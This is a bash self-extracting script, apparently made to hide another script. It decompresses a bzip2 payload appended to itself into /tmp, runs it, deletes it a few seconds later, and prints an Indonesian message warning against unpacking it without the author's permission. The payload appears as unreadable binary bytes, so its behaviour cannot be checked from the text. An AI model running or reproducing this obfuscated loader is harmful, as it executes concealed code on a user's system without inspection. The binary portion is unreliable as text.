#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�"�j ��� ����������pD@  � �<����؏X�GEd �  "����3@��  0� '�� �4�MI�jzd���� �4     � �i���=O�G�A�         D���&��bF�=# �2a1��M� 4 4� F  h    h �B&�4	=	��h%<�꟣R~��$�6�oT���P�Q�=Fɦ��6�.�cA~E^���ޥ6l��B71R-��� ����S$S���"�m=���L�+ʊ�%�O�J8�r44�DD�^� R.�b �@/����4_]о���b�d�z.�מ�\��t���fu��Z6�dqj�TP=;�K��^o!i+�<""� L����)F�z�WZ�XD:(���I�N�5��D�	�Q|
 Ԓ���P��J��Y!%p����[��:Q9~�;��;n��8���Y����Rh��YP�6}��y�ЛJ/4�)�W���3�vA>���R�	4�b���Hdc��|ɇx)����H6���)2+�նIb����ڈ��ֺ�[2�_���JP9��rMfn6l�`9�a��WQ�z��W��|8�����		c T �<�:R��GWXlxlΎ��1��Z<��DP�$�<�`���F�k�H���tJ� �X��c�ڴ���h	� @�ݒ��4-�Y
Pa��F��g](��=�33- O1�N���r4���pKf(i޻�O�ZS}w@(�2�G����$T��z0VP��(L��!�j���4T�m

�9�������ؖJ�)��h=#�aHA�Q6��+N0�7'�P=���
cC��x�|��Q���6&�]��D��m����JY�"��Ե��$VG����� ٿ �jU�dL����^�"����˭����R�c�|$H�o�.yH ՚�B_�b��(6��˕#��#����|�Da@0���;�1w�.����jg�$��h�������� |��/9:�|�R���2�Qu/��!�\V��� 0��H�cq`0�H�k���и��hYt�%������/;�J(�s�猫�VKm���i�R�&��F0¾�b�[���T��oN�U��8GC�5Vٕ���	�gqD��t�o�6���O%��y�9d�b�3`n���KBKS���
�ۗ/{�n][���"�l�cAq��:�ӳ�(��9t��^�Һ��,�$� y$H�����Lh��H�$�5k��nn��E�a���?x�pa�E����R��p~�>�^���@�)U��Q6}F�&prjw	���0p�Ì�Fp��3[����qMy4_�W,�>Ȝ�sAQ�	N��e���^t
Sɣ}���Ɏ��_�TD�5؀�Zhv��4�u�� ʥK;D.��^���t�$!Br���I6�CK2�����/>�`�f�Z���L�����'�@^ljd���wFdNm
s��:�4��1��Ei[�hYQ�/IPP3L��U�|���dn�3� 1���[��x	����P�a���?9
�1ZO��hױ��B; ����yP6X�*��(�t��<�:�:ӕʏ��9�+x�R���
�j�&K��w=0%0�����N4�*i�X�D��4����(��4(���dv��'��w�9RM�Ŷq�d	<�5t��Ɏ_�źΰFM��Rb�T���J�kT%:�C��K
�5�HL����*A++�XA*ZJ'Ax��ױ�\�)���Hf�$�h롩'4c�BT�"ʯ�h�F��^'z]�QS��=f����; rs	�pY�� �0;�N�hM�N�V6ҦQ�r7������h(��T���:=�t�Q�M�T�zt����i8AxEC��[�_H�i�N��7�6�xME9��AQv�P܇)D�h'(���\��%�hX��v�i���M׈���y)|12 P��Z9d�(MjƗQ���O³ߪ��y�!Gf�3�հ�Cc�y9�.G��`TÌ"�
�u*B����@��[�=���sb��D(&�˄���"�A;�N�@��U���un�!L�i \A���rr��޸{����J9cG��umX������>c���#���� �BA?�<�SƼ!�Ky.M���7�c�L�5�҃q�����
G�Lku��m�}I���<m�\n�d�/�Va�����` �s3Q�17��Pqp���r�~�X��¿����]ȝsoK�u}嵐!y�x�0��Ӟ���N�CXn{�w�3m��|S~E�|5�,p��ha����o�j�IP=݂����R����5�L�[�U00+�#\f��Ո����1.ؘ��,�y~�?��7���{C$�e�� �{i ;V7$���6(P4�gb6a���4�ޜ �T|���>
�d�;�P����4��m"�PM$����P"��AO�S����@�D�B��HPaB0"*�����(:Dh�R)���]��BB��ͨ